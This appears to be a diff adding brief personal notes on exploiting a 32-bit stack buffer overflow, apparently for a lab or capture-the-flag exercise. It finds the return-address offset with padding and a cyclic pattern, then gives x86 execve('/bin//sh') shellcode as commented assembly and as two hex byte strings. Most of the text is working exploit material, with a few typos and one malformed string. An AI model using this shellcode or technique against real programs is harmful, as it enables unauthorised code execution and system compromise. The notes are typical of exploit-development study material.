@@ -1,0 +1,46 @@
+** Generated **
+
+```sh
+pi print('A' * 80+'C'*4)
+
+or
+
+pattern create [n]
+
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
+
+eip got this : 
+$eip   : 0x61616175 ("uaaa"?),offset = 80;
+then next thigs after 80 will be in $eip
+```
+
+
+```s
+xor eax, eax          ; eax = 0
+push eax              ; push 0 (null terminator for string)
+
+push 0x68732f2f       ; push "//sh"
+push 0x6e69622f       ; push "/bin"
+
+mov ebx, esp          ; ebx = pointer to "/bin//sh"
+
+push eax              ; push 0 (argv[1] = NULL)
+push ebx              ; push pointer to "/bin//sh" (argv[0])
+
+mov ecx, esp          ; ecx = argv array pointer
+
+mov al, 0xb           ; eax = 11 (execve syscall number)
+int 0x80              ; syscall: execve("/bin//sh", argv, NULL)
+
+```
+
+```assembly
+
+    write this on on assembly :
+ 
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+    \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+```
